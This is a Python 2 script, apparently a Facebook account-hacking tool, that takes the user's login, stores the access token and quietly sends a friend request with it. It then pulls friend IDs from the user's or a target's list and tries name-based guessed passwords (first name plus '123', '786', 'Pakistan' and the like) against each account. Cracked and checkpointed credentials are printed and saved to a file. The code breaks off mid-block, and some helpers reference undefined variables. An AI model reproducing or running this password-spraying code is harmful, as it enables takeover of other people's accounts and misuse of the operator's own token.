#!/usr/bin/python2
#coding=utf-8


import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]


def keluar():
	print "\033[1;96m[!] \x1b[1;91mExit"
	os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(00000.1)


#### LOGO ####
logo = """
\033[1;96m──────────────────────────────────────────────────
\033[1;96m─████████████████───██████████████─────────██████─
\033[1;96m─██▒▒▒▒▒▒▒▒▒▒▒▒██───██▒▒▒▒▒▒▒▒▒▒██─────────██▒▒██─
\033[1;96m─██▒▒████████▒▒██───██▒▒██████▒▒██─────────██▒▒██─
\033[1;96m─██▒▒██────██▒▒██───██▒▒██──██▒▒██─────────██▒▒██─
\033[1;96m─██▒▒████████▒▒██───██▒▒██████▒▒██─────────██▒▒██─
\033[1;96m─██▒▒▒▒▒▒▒▒▒▒▒▒██───██▒▒▒▒▒▒▒▒▒▒██─────────██▒▒██─
\033[1;96m─██▒▒██████▒▒████───██▒▒██████▒▒██─██████──██▒▒██─
\033[1;96m─██▒▒██──██▒▒██─────██▒▒██──██▒▒██─██▒▒██──██▒▒██─
\033[1;96m─██▒▒██──██▒▒██████─██▒▒██──██▒▒██─██▒▒██████▒▒██─
\033[1;96m─██▒▒██──██▒▒▒▒▒▒██─██▒▒██──██▒▒██─██▒▒▒▒▒▒▒▒▒▒██─
\033[1;96m─██████──██████████─██████──██████─██████████████─
\033[1;96m──────────────────────────────────────────────────

\033[1;91m    ║══▒═💀═▒═💀═▒═══¤═¤═¤════════════¤═══¤═══¤═══║
\033[1;96m    ║✯ 𝕮𝖗𝖊𝖆𝖙𝖔𝖗  Ⲙꞅ.ⴑ𝛓ⲁⲙⲁ RAJ              ║    
\033[1;98m    ║✯ 𝖄𝖔𝖚𝖙𝖚𝖇𝖊 ☪ 𝖀𝖘𝖆𝖒𝖆 𝕿𝖗𝖎𝖈𝖐𝖊𝖗            ║  
\033[1;96m    ║✯ 𝕴𝖒 𝖓ø𝖙 𝖗𝖊𝖘𝖕𝖔𝖓𝖘𝖎𝖇𝖑𝖊 𝖋𝖔𝖗 𝖆𝖓𝖞 𝖒𝖎𝖘𝖘 𝖚𝖘𝖊  ║
\033[1;91m    ║══▒═💀═▒═💀═▒═══¤═¤═¤════════════¤═══¤═══¤═══║"""
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;95mPlease Wait \x1b[1;95m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")
print  """
\033[1;97m************************************************
\033[1;96m~ IM NOT RESPONSIBLE FOR ANY MISS USE MR RAJ~
\033[1;97m************************************************

\033[1;95m██████████████████████████████████████████████████
\033[1;95m█▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒███▒▒▒▒▒▒▒▒▒▒▒▒▒▒█████████▒▒▒▒▒▒█
\033[1;95m█▒▒▄▀▄▀▄▀▄▀▄▀▄▀▒▒███▒▒▄▀▄▀▄▀▄▀▄▀▒▒█████████▒▒▄▀▒▒█
\033[1;95m█▒▒▄▀▒▒▒▒▒▒▒▒▄▀▒▒███▒▒▄▀▒▒▒▒▒▒▄▀▒▒█████████▒▒▄▀▒▒█
\033[1;95m█▒▒▄▀▒▒████▒▒▄▀▒▒███▒▒▄▀▒▒██▒▒▄▀▒▒█████████▒▒▄▀▒▒█
\033[1;95m█▒▒▄▀▒▒▒▒▒▒▒▒▄▀▒▒███▒▒▄▀▒▒▒▒▒▒▄▀▒▒█████████▒▒▄▀▒▒█
\033[1;95m█▒▒▄▀▄▀▄▀▄▀▄▀▄▀▒▒███▒▒▄▀▄▀▄▀▄▀▄▀▒▒█████████▒▒▄▀▒▒█
\033[1;95m█▒▒▄▀▒▒▒▒▒▒▄▀▒▒▒▒███▒▒▄▀▒▒▒▒▒▒▄▀▒▒█▒▒▒▒▒▒██▒▒▄▀▒▒█
\033[1;95m█▒▒▄▀▒▒██▒▒▄▀▒▒█████▒▒▄▀▒▒██▒▒▄▀▒▒█▒▒▄▀▒▒██▒▒▄▀▒▒█
\033[1;95m█▒▒▄▀▒▒██▒▒▄▀▒▒▒▒▒▒█▒▒▄▀▒▒██▒▒▄▀▒▒█▒▒▄▀▒▒▒▒▒▒▄▀▒▒█
\033[1;95m█▒▒▄▀▒▒██▒▒▄▀▄▀▄▀▒▒█▒▒▄▀▒▒██▒▒▄▀▒▒█▒▒▄▀▄▀▄▀▄▀▄▀▒▒█
\033[1;95m█▒▒▒▒▒▒██▒▒▒▒▒▒▒▒▒▒█▒▒▒▒▒▒██▒▒▒▒▒▒█▒▒▒▒▒▒▒▒▒▒▒▒▒▒█
\033[1;95m██████████████████████████████████████████████████
 
\033[1;92m──────────────────────────────────────────────────
\033[1;92m─████████████████───██████████████─────────██████─
\033[1;92m─██▒▒▒▒▒▒▒▒▒▒▒▒██───██▒▒▒▒▒▒▒▒▒▒██─────────██▒▒██─
\033[1;92m─██▒▒████████▒▒██───██▒▒██████▒▒██─────────██▒▒██─
\033[1;92m─██▒▒██────██▒▒██───██▒▒██──██▒▒██─────────██▒▒██─
\033[1;92m─██▒▒████████▒▒██───██▒▒██████▒▒██─────────██▒▒██─
\033[1;92m─██▒▒▒▒▒▒▒▒▒▒▒▒██───██▒▒▒▒▒▒▒▒▒▒██─────────██▒▒██─
\033[1;92m─██▒▒██████▒▒████───██▒▒██████▒▒██─██████──██▒▒██─
\033[1;92m─██▒▒██──██▒▒██─────██▒▒██──██▒▒██─██▒▒██──██▒▒██─
\033[1;92m─██▒▒██──██▒▒██████─██▒▒██──██▒▒██─██▒▒██████▒▒██─
\033[1;92m─██▒▒██──██▒▒▒▒▒▒██─██▒▒██──██▒▒██─██▒▒▒▒▒▒▒▒▒▒██─
\033[1;92m─██████──██████████─██████──██████─██████████████─
\033[1;92m──────────────────────────────────────────────────



CorrectUsername = "raj"
CorrectPassword = "raj"
loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;91m📋 \x1b[1;95mTool Username \x1b[1;91m»» \x1b[1;91m")
    if (username == CorrectUsername):
    	password = raw_input("\033[1;91m🗝 \x1b[1;95mTool Password \x1b[1;91m»» \x1b[1;91m")
        if (password == CorrectPassword):
            print "Logged in successfully as " + username #Dev:KHONDOKAR-TICK
	    time.sleep(2)
            loop = 'false'
        else:
            print "\033[1;96mWrong Password"
            os.system('xdg-open https://www.facebook.com/Khondokar.rahim73')
    else:
        print "\033[1;96mWrong Username"
        os.system('xdg-open https://www.facebook.com/Khondokar.rahim73')

def login():
	os.system('clear')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
		print logo
		print 42*"\033[1;96m="
		print('\033[1;96m[⚡] \x1b[1;91m───Login your new ID───\x1b[1;93m[⚡]' )
		id = raw_input('\033[1;93m[+] \x1b[0;34mEnter ID/Email \x1b[1;95m: \x1b[1;95m')
		pwd = raw_input('\033[1;95m[+] \x1b[0;34mEnter Password \x1b[1;93m: \x1b[1;93m')
		tik()
		try:
			br.open('https://m.facebook.com')
		except mechanize.URLError:
			print"\n\033[1;96m[!] \x1b[1;91mTidak ada koneksi"
			keluar()
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form['email'] = id
		br.form['pass'] = pwd
		br.submit()
		url = br.geturl()
		if 'save-device' in url:
			try:
				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
				x=hashlib.new("md5")
				x.update(sig)
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://api.facebook.com/restserver.php"
				r=requests.get(url,params=data)
				z=json.loads(r.text)
				unikers = open("login.txt", 'w')
				unikers.write(z['access_token'])
				unikers.close()
				print '\n\033[1;96m[✓] \x1b[1;92mLogin Hogai'
				os.system('xdg-open https://www.facebook.com/Khondokar.rahim73') 
				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
				menu()
			except requests.exceptions.ConnectionError:
				print"\n\033[1;96m[!] \x1b[1;91mTidak ada koneksi"
				keluar()
		if 'checkpoint' in url:
			print("\n\033[1;96m[!] \x1b[1;91mAisa lagta hai apka account checkpoint pe hai")
			os.system('rm -rf login.txt')
			time.sleep(1)
			keluar()
		else:
			print("\n\033[1;96m[!] \x1b[1;91mPassword/Email ghalat hai")
			os.system('rm -rf login.txt')
			time.sleep(1)
			login()


def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print"\x1b[1;91m[!] Token invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
		ots = requests.get('https://graph.facebook.com/me/subscribers?access_token=' + toket)
		b = json.loads(ots.text)
		sub = str(b['summary']['total_count'])
	except KeyError:
		os.system('clear')
		print"\033[1;91mYour Account is on Checkpoint"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	except requests.exceptions.ConnectionError:
		print"\x1b[1;92mThere is no internet connection"
		keluar()
	os.system("clear")
	print logo
	print "\033[1;36;40m      ╔═════════════════════════════════╗"
	print "\033[1;36;40m      ║\033[1;32;40m[*] Name\033[1;32;40m: "+nama+"  	   \033[1;36;40m║"                               
	print "\033[1;36;40m      ║\033[1;34;40m[*] ID  \033[1;34;40m: "+id+"        \033[1;36;40m║"
	print "\033[1;36;40m      ║\033[1;34;40m[*] Subs\033[1;34;40m: "+sub+"                      \033[1;36;40m║"
	print "\033[1;36;40m      ╚═════════════════════════════════╝"
	print "    \033[1;32;40m[Type1] \033[1;33;40m‹•.•›Start♥Hacking"	
	print "    \033[1;32;40m[type2] \033[1;33;40m‹•.•›Update"																														
	print "    \033[1;32;40m[type0] \033[1;33;40m‹•.•›Logout"
	pilih()

def pilih():
	unikers = raw_input("\n\033[1;31;40m>>> \033[1;35;40m")
	if unikers =="":
		print "\x1b[1;91mFill in correctly"
		pilih()
	elif unikers =="1":
		super()
	elif unikers =="2":
		os.system('clear')
		print logo
		print " \033[1;36;40m●══════════════════◄►══════════════════●\n"
		os.system('git pull origin master')
		raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
		menu()
	elif unikers =="0":
		jalan('Token Removed')
		os.system('rm -rf login.txt')
		keluar()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih()

def super():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
	print "     \033[1;97m-•◈•-\033[1;91m> \033[1;91m1.\x1b[1;95m>_<Clone Friend List."
	print "     \033[1;97m-•◈•-\033[1;91m> \033[1;91m2.\x1b[1;95m>_<Hack Public Accounts ."
	print "     \033[1;97m-•◈•-\033[1;91m> \033[1;91m0.\033[1;91m>_<Back"
	pilih_super()

def pilih_super():
	peak = raw_input("\n\033[1;91m^.^Choose an Option>>> \033[1;95m")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_super()
	elif peak =="1":
		os.system('clear')
		print logo
		print "\033[1;97m•◈•══════•◈•\033[1;91mBlackTiger\033[1;97m•◈•══════•◈•"
		jalan('\033[1;91mGetting IDs \033[1;91m...')
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif peak =="2":
		os.system('clear')
		print logo
		idt = raw_input("\033[1;95m[•◈•] \033[1;91mEnter ID\033[1;95m: \033[1;95m")
		print "\033[1;92m•◈•══════••◈•\033[1;91mBlackTiger\033[1;95m•◈•══════••◈•"
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;91mName\033[1;95m:\033[1;95m "+op["name"]
		except KeyError:
			print"\x1b[1;91mID Not Found!"
			raw_input("\n\033[1;95m[\033[1;91mBack\033[1;95m]")
			super()
		print"\033[1;91mGetting IDs\033[1;97m..."
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="0":
		menu()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih_super()
	
	print "\033[1;36;40m[✺] Total IDs : \033[1;94m"+str(len(id))
	jalan('\033[1;34;40m[✺] Please Wait...')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;32;40m[✺] Cloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
	print "\n\033[1;94m        ❈     \x1b[1;91mTo Stop Process Press CTRL+Z \033[1;94m    ❈"
	print "   \033[1;92m●══════════════════◄►══════════════════●"

	jalan('           \033[1;91mHACKER-RAJ start cloning Wait...')
	print  "  \033[1;92m ●══════════════════◄►══════════════════●" 

	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass #Dev:raj
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)												
			b = json.loads(a.text)												
			pass1 = b['first_name'] + '1234'												
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			q = json.load(data)												
			if 'access_token' in q:
				x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				z = json.loads(x.text)
				print '\x1b[1;94m[  ✓  ] \x1b[1;92mHack100%💉'											
				print '\x1b[1;94m[•⚔•] \x1b[1;91mName \x1b[1;91m    ✯ \x1b[1;92m' + b['name']											
				print '\x1b[1;94m[•⚔•] \x1b[1;91mID \x1b[1;91m      ✯ \x1b[1;92m' + user											
				print '\x1b[1;94m[•⚔•] \x1b[1;91mPassword \x1b[1;91m✯ \x1b[1;92m' + pass1 + '\n'											
				oks.append(user+pass1)
                        else:
			        if 'www.facebook.com' in q["error_msg"]:
				    print '\x1b[1;94m[ ❥ ] \x1b[1;94mCheckpoint'
				    print '\x1b[1;94m[•⚔•] \x1b[1;94mName \x1b[1;94m    ✯ \x1b[1;95m' + b ['name']
				    print '\x1b[1;94m[•⚔•] \x1b[1;94mID \x1b[1;94m      ✯ \x1b[1;95m' + user
				    print '\x1b[1;94m[•⚔•] \x1b[1;94mPassword \x1b[1;94m✯ \x1b[1;95m' + pass1 + '\n'
				    cek = open("out/super_cp.txt", "a")
				    cek.write("ID:" +user+ " Pw:" +pass1+"\n")
				    cek.close()
				    cekpoint.append(user+pass1)
                                else:
				    pass2 = b['first_name'] + '123'										
                                    data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			            q = json.load(data)												
			            if 'access_token' in q:	
				            x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				            z = json.loads(x.text)
				            print '\x1b[1;94m[  ✓  ] \x1b[1;92mHack100%💉'											
				            print '\x1b[1;94m[•⚔•] \x1b[1;91mName \x1b[1;91m    ✯ \x1b[1;92m' + b['name']											
				            print '\x1b[1;94m[•⚔•] \x1b[1;91mID \x1b[1;91m      ✯ \x1b[1;92m' + user								
				            print '\x1b[1;94m[•⚔•] \x1b[1;91mPassword \x1b[1;91m✯ \x1b[1;92m' + pass2 + '\n'											
				            oks.append(user+pass2)
                                    else:
			                   if 'www.facebook.com' in q["error_msg"]:
				               print '\x1b[1;94m[ ❥ ] \x1b[1;94mCheckpoint'
				               print '\x1b[1;94m[•⚔•] \x1b[1;94mName \x1b[1;94m    ✯ \x1b[1;95m' + b['name']
				               print '\x1b[1;94m[•⚔•] \x1b[1;94mID \x1b[1;94m      ✯ \x1b[1;95m' + user
				               print '\x1b[1;94m[•⚔•] \x1b[1;94mPassword \x1b[1;94m✯ \x1b[1;95m' + pass2 + '\n'
				               cek = open("out/super_cp.txt", "a")
				               cek.write("ID:" +user+ " Pw:" +pass2+"\n")
				               cek.close()
				               cekpoint.append(user+pass2)								
				           else:											
					       pass3 = b['last_name']+'123'										
					       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")										
					       q = json.load(data)										
					       if 'access_token' in q:	
						       x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                       z = json.loads(x.text)
						       print '\x1b[1;94m[  ✓  ] \x1b[1;92mHack100%💉'								
						       print '\x1b[1;94m[•⚔•] \x1b[1;91mName \x1b[1;91m    ✯ \x1b[1;92m' + b['name']									
						       print '\x1b[1;94m[•⚔•] \x1b[1;91mID \x1b[1;91m      ✯ \x1b[1;92m' + user							
						       print '\x1b[1;94m[•⚔•] \x1b[1;91mPassword \x1b[1;91m✯ \x1b[1;92m' + pass3 + '\n'									
						       oks.append(user+pass3)
                                               else:
			                               if 'www.facebook.com' in q["error_msg"]:
				                           print '\x1b[1;94m[ ❥ ] \x1b[1;94mCheckpoint'
				                           print '\x1b[1;94m[•⚔•] \x1b[1;94mName \x1b[1;94m    ✯ \x1b[1;95m' + b['name']
				                           print '\x1b[1;94m[•⚔•] \x1b[1;94mID \x1b[1;94m      ✯ \x1b[1;95m' + user
				                           print '\x1b[1;94m[•⚔•] \x1b[1;94mPassword \x1b[1;94m✯ \x1b[1;95m' + pass3 + '\n'
				                           cek = open("out/super_cp.txt", "a")
				                           cek.write("ID:" +user+ " Pw:" +pass3+"\n")
				                           cek.close()
				                           cekpoint.append(user+pass3)									
					               else:										
						           pass4 = b['first_name'] + 'khan'											
			                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			                                   q = json.load(data)												
			                                   if 'access_token' in q:		
						                   x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                   z = json.loads(x.text)
				                                   print '\x1b[1;94m[  ✓  ] \x1b[1;92mHack100%💉'											
				                                   print '\x1b[1;94m[•⚔•] \x1b[1;91mName \x1b[1;91m    ✯ \x1b[1;92m' + b['name']											
				                                   print '\x1b[1;94m[•⚔•] \x1b[1;91mID \x1b[1;91m      ✯ \x1b[1;92m' + user											
				                                   print '\x1b[1;94m[•⚔•] \x1b[1;91mPassword \x1b[1;91m✯ \x1b[1;92m' + pass4 + '\n'											
				                                   oks.append(user+pass4)
                                                           else:
			                                           if 'www.facebook.com' in q["error_msg"]:
				                                       print '\x1b[1;94m[ ❥ ] \x1b[1;94mCheckpoint'
				                                       print '\x1b[1;94m[•⚔•] \x1b[1;94mName \x1b[1;94m    ✯ \x1b[1;95m' + b['name']
				                                       print '\x1b[1;94m[•⚔•] \x1b[1;94mID \x1b[1;94m      ✯ \x1b[1;95m' + user
				                                       print '\x1b[1;94m[•⚔•] \x1b[1;94mPassword \x1b[1;94m✯ \x1b[1;95m' + pass4 + '\n'
				                                       cek = open("out/super_cp.txt", "a")
				                                       cek.write("ID:" +user+ " Pw:" +pass4+"\n")
				                                       cek.close()
				                                       cekpoint.append(user+pass4)					
					                           else:									
						                       pass5 = '786786'							
						                       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")								
						                       q = json.load(data)								
						                       if 'access_token' in q:	
						                               x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                               z = json.loads(x.text)
						                               print '\x1b[1;94m[  ✓  ] \x1b[1;92mHack100%💉'						
						                               print '\x1b[1;94m[•⚔•] \x1b[1;91mName \x1b[1;91m    ✯ \x1b[1;92m' + b['name']							
						                               print '\x1b[1;94m[•⚔•] \x1b[1;91mID \x1b[1;91m      ✯ \x1b[1;92m' + user					
						                               print '\x1b[1;94m[•⚔•] \x1b[1;91mPassword \x1b[1;91m✯ \x1b[1;92m' + pass5 + '\n'							
						                               oks.append(user+pass5)	
                                                                       else:
			                                                       if 'www.facebook.com' in q["error_msg"]:
				                                                   print '\x1b[1;94m[ ❥ ] \x1b[1;94mCheckpoint'
				                                                   print '\x1b[1;94m[•⚔•] \x1b[1;94mName \x1b[1;94m    ✯ \x1b[1;95m' + b['name']
				                                                   print '\x1b[1;94m[•⚔•] \x1b[1;94mID \x1b[1;94m      ✯ \x1b[1;95m' + user
				                                                   print '\x1b[1;94m[•⚔•] \x1b[1;94mPassword \x1b[1;94m✯ \x1b[1;95m' + pass5 + '\n'
				                                                   cek = open("out/super_cp.txt", "a")
				                                                   cek.write("ID:" +user+ " Pw:" +pass5+"\n")
				                                                   cek.close()
				                                                   cekpoint.append(user+pass5)					
						                               else:								
							                           pass6 = 'Pakistan'											
			                                                           data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			                                                           q = json.load(data)												
			                                                           if 'access_token' in q:	
								                           x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                           z = json.loads(x.text)
				                                                           print '\x1b[1;94m[  ✓  ] \x1b[1;92mHack100%💉'											
				                                                           print '\x1b[1;94m[•⚔•] \x1b[1;91mName \x1b[1;91m    ✯ \x1b[1;92m' + b['name']											
				                                                           print '\x1b[1;94m[•⚔•] \x1b[1;91mID \x1b[1;91m      ✯ \x1b[1;92m' + user									
				                                                           print '\x1b[1;94m[•⚔•] \x1b[1;91mPassword \x1b[1;91m✯ \x1b[1;92m' + pass6 + '\n'											
				                                                           oks.append(user+pass6)
                                                                                   else:
			                                                                   if 'www.facebook.com' in q["error_msg"]:
				                                                               print '\x1b[1;94m[ ❥ ] \x1b[1;94mCheckpoint'
				                                                               print '\x1b[1;94m[•⚔•] \x1b[1;94mName \x1b[1;94m    ✯ \x1b[1;95m' + b['name']
				                                                               print '\x1b[1;94m[•⚔•] \x1b[1;94mID \x1b[1;94m      ✯ \x1b[1;95m' + user
				                                                               print '\x1b[1;94m[•⚔•] \x1b[1;94mPassword \x1b[1;94m✯ \x1b[1;95m' + pass6 + '\n'
				                                                               cek = open("out/super_cp.txt", "a")
				                                                               cek.write("ID:" +user+ " Pw:" +pass6+"\n")
				                                                               cek.close()
				                                                               cekpoint.append(user+pass6)	
						                                           else:							
								                               pass7 = b['first_name']+'12345'						
								                               data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")						
								                               q = json.load(data)						
								                               if 'access_token' in q:		
				                                                                       x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                                       z = json.loads(x.text)
									                               print '\x1b[1;94m[  ✓  ] \x1b[1;92mHack100%💉'					
									                               print '\x1b[1;94m[•⚔•] \x1b[1;91mName \x1b[1;91m    ✯ \x1b[1;92m' + b['name']					
									                               print '\x1b[1;94m[•⚔•] \x1b[1;91mID \x1b[1;91m      ✯ \x1b[1;92m' + user				
									                               print '\x1b[1;94m[•⚔•] \x1b[1;91mPassword \x1b[1;91m✯ \x1b[1;92m' + pass7 + '\n'					
									                               oks.append(user+pass7)
                                                                                               else:
			                                                                               if 'www.facebook.com' in q["error_msg"]:
				                                                                           print '\x1b[1;94m[ ❥ ] \x1b[1;94mCheckpoint'
				                                                                           print '\x1b[1;94m[•⚔•] \x1b[1;94mName \x1b[1;94m    ✯ \x1b[1;95m' + b['name']
				                                                                           print '\x1b[1;94m[•⚔•] \x1b[1;94mID \x1b[1;94m      ✯ \x1b[1;95m' + user
				                                                                           print '\x1b[1;94m[•⚔•] \x1b[1;94mPassword \x1b[1;94m✯ \x1b[1;95m' + pass7 + '\n'
				                                                                           cek = open("out/super_cp.txt", "a")
				                                                                           cek.write("ID:" +user+ " Pw:" +pass7+"\n")
				                                                                           cek.close()
				                                                                           cekpoint.append(user+pass7)           					
								                                       else:						
										                           pass8 = b['last_name'] + '786'											
			                                                                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			                                                                                   q = json.load(data)												
			                                                                                   if 'access_token' in q:		
										                                   x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                                                   z = json.loads(x.text)
				                                                                                   print '\x1b[1;94m[  ✓  ] \x1b[1;92mHack100%💉'											
				                                                                                   print '\x1b[1;94m[•⚔•] \x1b[1;91mName \x1b[1;91m    ✯ \x1b[1;92m' + b['name']											
				                                                                                   print '\x1b[1;94m[•⚔•] \x1b[1;91mID \x1b[1;91m      ✯ \x1b[1;92m' + user										
				                                                                                   print '\x1b[1;94m[•⚔•] \x1b[1;91mPassword \x1b[1;91m✯ \x1b[1;92m' + pass8 + '\n'											
				                                                                                   oks.append(user+pass8)
                                                                                                           else:
			                                                                                           if 'www.facebook.com' in q["error_msg"]:
				                                                                                       print '\x1b[1;94m[ ❥ ] \x1b[1;94mCheckpoint'
				                                                                                       print '\x1b[1;94m[•⚔•] \x1b[1;94mName \x1b[1;94m    ✯ \x1b[1;95m' + b['name']
				                                                                                       print '\x1b[1;94m[•⚔•] \x1b[1;94mID \x1b[1;94m      ✯ \x1b[1;95m' + user
				                                                                                       print '\x1b[1;94m[•⚔•] \x1b[1;94mPassword \x1b[1;94m✯ \x1b[1;95m' + pass8 + '\n'
				                                                                                       cek = open("out/super_cp.txt", "a")
				                                                                                       cek.write("ID:" +user+ " Pw:" +pass8+"\n")
				                                                                                       cek.close()
				                                                                                       cekpoint.append(user+pass8)   	
										                                   else:					
										                                       pass9 = b['first_name'] + '786'					
										                                       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass9)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")				
										                                       q = json.load(data)				
										                                       if 'access_token' in q:		
		                                                                                                               x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                                                               z = json.loads(x.text)
											                                       print '\x1b[1;94m[  ✓  ] \x1b[1;92mHack100%💉'			
											                                       print '\x1b[1;94m[•⚔•] \x1b[1;91mName \x1b[1;91m    ✯ \x1b[1;92m' + b['name']			
											                                       print '\x1b[1;94m[•⚔•] \x1b[1;91mID \x1b[1;91m      ✯ \x1b[1;92m' + user	
											                                       print '\x1b[1;94m[•⚔•] \x1b[1;91mPassword \x1b[1;91m✯ \x1b[1;92m' + pass9 + '\n'			
											                                       oks.append(user+pass9)
                                                                                                                       else:
			                                                                                                       if 'www.facebook.com' in q["error_msg"]:
				                                                                                                   print '\x1b[1;94m[ ❥ ] \x1b[1;94mCheckpoint'
				                                                                                                   print '\x1b[1;94m[•⚔•] \x1b[1;94mName \x1b[1;94m    ✯ \x1b[1;95m' + b['name']
				                                                                                                   print '\x1b[1;94m[•⚔•] \x1b[1;94mID \x1b[1;94m      ✯ \x1b[1;95m' + user
				                                                                                                   print '\x1b[1;94m[•⚔•] \x1b[1;94mPassword \x1b[1;94m✯ \x1b[1;95m' + pass9 + '\n'
				                                                                                                   cek = open("out/super_cp.txt", "a")
